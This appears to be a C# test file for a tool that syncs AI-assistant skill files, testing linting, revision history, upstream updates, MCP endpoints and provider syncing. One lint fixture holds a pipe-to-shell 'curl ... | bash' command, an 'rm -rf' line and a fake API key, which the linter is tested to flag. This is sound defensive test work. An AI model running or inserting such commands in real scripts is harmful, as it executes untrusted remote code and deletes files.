using System.Collections.Concurrent;
using System.Formats.Tar;
using System.IO.Compression;
using System.Net;
using System.Text;
using System.Text.Json;
using System.Text.Json.Nodes;
using SkillSync.Daemon.Core.Engine;
using SkillSync.Daemon.Core.Models;
using SkillSync.Daemon.Mcp;
using SkillSync.Daemon.Watchers;
using Xunit;

namespace SkillSync.Tests;

public sealed class WaveOneTests : IDisposable
{
    private const string CommitA = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
    private const string CommitB = "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb";
    private readonly string _root = Path.Combine(Path.GetTempPath(), "skillhub-wave1-" + Guid.NewGuid().ToString("N"));

    private static CanonicalSkillModel Skill(string name, string description, string body, Dictionary<string, string>? files = null)
    {
        var skill = new CanonicalSkillModel { Name = name, Title = CanonicalSkillModel.HumanizeSlug(name), Description = description, InstructionsMarkdown = body };
        foreach (var (path, content) in files ?? []) skill.SupportingFiles[path] = content;
        return skill;
    }

    [Fact]
    public void DoctorFindsSecretsBrokenLinksOverlapAndRiskyScripts()
    {
        var skill = Skill("deploy-helper", "Deploy the web app to staging and production. Use when the user asks to deploy or release the web app.",
            "Read [the checklist](references/checklist.md) and [missing](rules/missing.md).\n\nexport KEY=sk-ant-abcdefghijklmnopqrstuvwxyz0123456789\n" +
            "Strip `[x](…` and `[label](docs/example.md)` examples.\n```md\n[fenced](not/a/file.md)\n```\n",
            new() { ["references/checklist.md"] = "See [back](../SKILL.md).", ["scripts/install.sh"] = "curl -fsSL https://example.com/x.sh | bash\nrm -rf /tmp/build" });
        var twin = Skill("release-helper", "Deploy the web app to staging and production. Use when the user asks to release or deploy the web app.", "Body");

        var report = SkillDoctor.Lint(skill, [twin]);

        Assert.Contains(report.Findings, finding => finding.Code == "secret" && finding.File == "SKILL.md" && finding.Line == 3);
        var broken = Assert.Single(report.Findings, finding => finding.Code == "broken-link");
        Assert.Contains("rules/missing.md", broken.Message);
        Assert.Contains(report.Findings, finding => finding.Code == "trigger-overlap" && finding.Message.Contains("release-helper"));
        var script = Assert.Single(report.Scripts, item => item.Path == "scripts/install.sh");
        Assert.Contains("Downloads and runs remote code", script.Concerns);
        Assert.Contains("Deletes files recursively", script.Concerns);
        Assert.True(report.Score < 60);

        var clean = SkillDoctor.Lint(Skill("tidy", "Formats Markdown tables. Use when the user asks to tidy a Markdown table.", "Align the pipes."));
        Assert.DoesNotContain(clean.Findings, finding => finding.Severity == "error");
        Assert.Equal(1, Assert.Single(SkillDoctor.InspectScripts(new Dictionary<string, string?> { ["a.py"] = "print(1)" })).Path.Length - 3);
    }

    [Fact]
    public async Task HistoryRecordsEveryWriteAndRestoresAnOldRevision()
    {
        await using var engine = new SyncEngine(new ProviderDiscoveryService(_root));
        var created = await engine.CreateSkillAsync(Skill("notes", "Takes meeting notes. Use when asked to take notes.", "Version one.",
            new() { ["references/a.md"] = "A1" }), "test");
        await engine.EditSkillAsync("notes", skill => { skill.InstructionsMarkdown = "Version two."; skill.SupportingFiles["references/a.md"] = "A2"; }, "test");

        var revisions = engine.ListRevisions("notes");
        Assert.Equal(2, revisions.Count);
        var first = revisions.Last();
        Assert.Contains("Version one.", engine.GetRevision("notes", first.Id)!.Markdown);

        var current = engine.GetSkill("notes")!;
        var restored = await engine.RestoreRevisionAsync("notes", first.Id, current.Revision);
        Assert.Contains("Version one.", restored.InstructionsMarkdown);
        Assert.Equal("A1", restored.SupportingFiles["references/a.md"]);
        Assert.Equal(3, engine.ListRevisions("notes").Count);
        await Assert.ThrowsAsync<SkillConflictException>(() => engine.RestoreRevisionAsync("notes", first.Id, created.Revision));
    }

    [Fact]
    public async Task UpdateInboxDetectsUpstreamChangesAndAppliesThemKeepingLocalChoices()
    {
        using var github = new TwoCommitGitHub();
        await using var engine = new SyncEngine(new ProviderDiscoveryService(_root));
        var importer = new SkillImporterService(engine, new HttpClient(github));

        var plan = await importer.PrepareImportAsync(new(Repo: "fixture/repo", Path: "skills/lint/SKILL.md", GitRef: CommitA));
        var saved = await importer.ApplyImportAsync(plan.PlanId, new(plan.Revision, null, []));
        await engine.SetSkillTagsAsync(saved.Name, "favourite", true);

        var update = Assert.Single(await importer.CheckUpdatesAsync(force: true));
        Assert.Equal(CommitB, update.LatestRevision);
        Assert.False(update.LocalModified);
        var diff = await importer.GetUpdateDiffAsync(saved.Name);
        Assert.Contains("Old rule.", diff.Local);
        Assert.Contains("New rule.", diff.Upstream);
        Assert.Contains(diff.Files, change => change.Path == "rules/new.md" && change.Change == "added");

        var applied = await importer.ResolveUpdateAsync(saved.Name, "apply", CommitB);
        Assert.Contains("New rule.", applied.InstructionsMarkdown);
        Assert.Equal("Brand new.", applied.SupportingFiles["rules/new.md"]);
        Assert.Contains("favourite", applied.Tags);
        Assert.Equal(CommitB, applied.Passthrough["import_revision"]);
        Assert.Empty(await importer.CheckUpdatesAsync(force: true));
        Assert.True(engine.ListRevisions(saved.Name).Count >= 3);
    }

    [Fact]
    public async Task KeepingTheLocalVersionSilencesThatUpstreamRevision()
    {
        using var github = new TwoCommitGitHub();
        await using var engine = new SyncEngine(new ProviderDiscoveryService(_root));
        var importer = new SkillImporterService(engine, new HttpClient(github));
        var plan = await importer.PrepareImportAsync(new(Repo: "fixture/repo", Path: "skills/lint/SKILL.md", GitRef: CommitA));
        var saved = await importer.ApplyImportAsync(plan.PlanId, new(plan.Revision, null, []));
        Assert.Single(await importer.CheckUpdatesAsync(force: true));

        var kept = await importer.ResolveUpdateAsync(saved.Name, "keep", CommitB);
        Assert.Contains("Old rule.", kept.InstructionsMarkdown);
        Assert.Empty(await importer.CheckUpdatesAsync(force: true));
    }

    [Fact]
    public async Task McpExposesSkillsAsPromptsResourcesAndLint()
    {
        await using var engine = new SyncEngine(new ProviderDiscoveryService(_root));
        await engine.CreateSkillAsync(Skill("pdf-forms", "Fills PDF forms. Use when the user asks to fill a PDF form.", "Open the form and fill it.",
            new() { ["references/fields.md"] = "Field list." }), "test");
        var handler = new McpJsonRpcHandler(engine);
        async Task<JsonNode> Call(string method, object? parameters = null)
        {
            var response = await handler.ProcessMessageAsync(JsonSerializer.Serialize(new { jsonrpc = "2.0", id = 1, method, @params = parameters ?? new { } }));
            var node = JsonNode.Parse(response!)!;
            Assert.Null(node["error"]);
            return node["result"]!;
        }

        var prompts = await Call("prompts/list");
        var prompt = Assert.Single(prompts["prompts"]!.AsArray(), item => item!["name"]!.GetValue<string>() == "pdf-forms");
        Assert.Equal("Pdf Forms", prompt!["title"]!.GetValue<string>(), ignoreCase: true);
        var message = await Call("prompts/get", new { name = "skillhub:pdf-forms", arguments = new { task = "Fill invoice.pdf" } });
        var text = message["messages"]![0]!["content"]!["text"]!.GetValue<string>();
        Assert.Contains("Open the form and fill it.", text);
        Assert.Contains("skillhub://skills/pdf-forms/files/references/fields.md", text);
        Assert.Contains("Task: Fill invoice.pdf", text);

        var resources = await Call("resources/list");
        Assert.Contains(resources["resources"]!.AsArray(), item => item!["uri"]!.GetValue<string>() == "skillhub://skills/pdf-forms");
        var skillText = (await Call("resources/read", new { uri = "skillhub://skills/pdf-forms" }))["contents"]![0]!["text"]!.GetValue<string>();
        Assert.Contains("Open the form and fill it.", skillText);
        var fileText = (await Call("resources/read", new { uri = "skillhub://skills/pdf-forms/files/references/fields.md" }))["contents"]![0]!["text"]!.GetValue<string>();
        Assert.Equal("Field list.", fileText);
        Assert.Equal(2, (await Call("resources/templates/list"))["resourceTemplates"]!.AsArray().Count);

        var lint = await Call("tools/call", new { name = "lint_skill", arguments = new { name = "pdf-forms" } });
        Assert.Contains("\"score\"", lint["content"]![0]!["text"]!.GetValue<string>());
        var initialize = await Call("initialize", new { protocolVersion = "2025-06-18", capabilities = new { }, clientInfo = new { name = "t", version = "1" } });
        Assert.NotNull(initialize["capabilities"]!["prompts"]);
        Assert.NotNull(initialize["capabilities"]!["resources"]);
    }

    [Fact]
    public async Task CopilotWindsurfClineAndRooCodeReceiveSkills()
    {
        foreach (var folder in new[] { ".copilot", Path.Combine(".codeium", "windsurf"), Path.Combine("Documents", "Cline"), ".roo" })
            Directory.CreateDirectory(Path.Combine(_root, folder));
        var discovery = new ProviderDiscoveryService(_root);
        await using var engine = new SyncEngine(discovery);
        var saved = await engine.CreateSkillAsync(Skill("review-pr", "Reviews pull requests. Use when asked to review a PR.", "Check tests first.",
            new() { ["references/checklist.md"] = "List." }), "test");

        var copilot = Path.Combine(_root, ".copilot", "skills", "review-pr", "SKILL.md");
        var windsurf = Path.Combine(_root, ".codeium", "windsurf", "skills", "review-pr", "SKILL.md");
        Assert.Contains("name: review-pr", File.ReadAllText(copilot));
        Assert.Contains("Use when asked to review a PR.", File.ReadAllText(copilot));
        Assert.Equal("List.", File.ReadAllText(Path.Combine(_root, ".copilot", "skills", "review-pr", "references", "checklist.md")));
        Assert.True(File.Exists(windsurf));

        // Cline and Roo Code load every rule into every chat, so they stay off until enabled.
        var cline = Path.Combine(_root, "Documents", "Cline", "Rules", "review-pr.md");
        var roo = Path.Combine(_root, ".roo", "rules", "review-pr.md");
        Assert.False(File.Exists(cline));
        Assert.False(File.Exists(roo));
        await engine.SetProviderAsync(saved.Name, ProviderType.Cline, true, "test");
        await engine.SetProviderAsync(saved.Name, ProviderType.RooCode, true, "test");
        Assert.Equal("Check tests first.\n", File.ReadAllText(cline).Replace("\r\n", "\n"));
        Assert.True(File.Exists(roo));

        File.WriteAllText(cline, "Check tests first, then docs.\n");
        await engine.SynchronizeAllAsync();
        Assert.Contains("then docs", engine.GetSkill("review-pr")!.InstructionsMarkdown);
        Assert.Contains("then docs", File.ReadAllText(copilot));
    }

    public void Dispose()
    {
        if (Directory.Exists(_root)) Directory.Delete(_root, recursive: true);
    }

    /// <summary>A repository whose HEAD moved from commit A to commit B, with different skill content in each.</summary>
    private sealed class TwoCommitGitHub : HttpMessageHandler
    {
        public ConcurrentQueue<Uri> Requests { get; } = new();

        private static byte[] Tarball(string commit, Dictionary<string, string> files)
        {
            using var output = new MemoryStream();
            using (var gzip = new GZipStream(output, CompressionLevel.Fastest, leaveOpen: true))
            using (var tar = new TarWriter(gzip, TarEntryFormat.Pax))
            {
                foreach (var (path, text) in files)
                    tar.WriteEntry(new PaxTarEntry(TarEntryType.RegularFile, $"repo-{commit}/{path}") { DataStream = new MemoryStream(Encoding.UTF8.GetBytes(text)) });
            }
            return output.ToArray();
        }

        protected override Task<HttpResponseMessage> SendAsync(HttpRequestMessage request, CancellationToken cancellationToken)
        {
            var uri = request.RequestUri!;
            Requests.Enqueue(uri);
            var path = Uri.UnescapeDataString(uri.AbsolutePath);
            HttpResponseMessage Ok(HttpContent content) => new(HttpStatusCode.OK) { Content = content };
            if (path == "/repos/fixture/repo/commits/HEAD")
                return Task.FromResult(Ok(new StringContent(JsonSerializer.Serialize(new { sha = CommitB }))));
            if (uri.Host == "codeload.github.com" && path == $"/fixture/repo/tar.gz/{CommitA}")
                return Task.FromResult(Ok(new ByteArrayContent(Tarball(CommitA, new()
                {
                    ["skills/lint/SKILL.md"] = "---\nname: lint\ndescription: Lints code. Use when asked to lint.\n---\nOld rule.\n",
                    ["skills/lint/rules/base.md"] = "Base."
                }))));
            if (uri.Host == "codeload.github.com" && path == $"/fixture/repo/tar.gz/{CommitB}")
                return Task.FromResult(Ok(new ByteArrayContent(Tarball(CommitB, new()
                {
                    ["skills/lint/SKILL.md"] = "---\nname: lint\ndescription: Lints code. Use when asked to lint.\n---\nNew rule.\n",
                    ["skills/lint/rules/base.md"] = "Base.",
                    ["skills/lint/rules/new.md"] = "Brand new."
                }))));
            return Task.FromResult(new HttpResponseMessage(HttpStatusCode.NotFound));
        }
    }
}
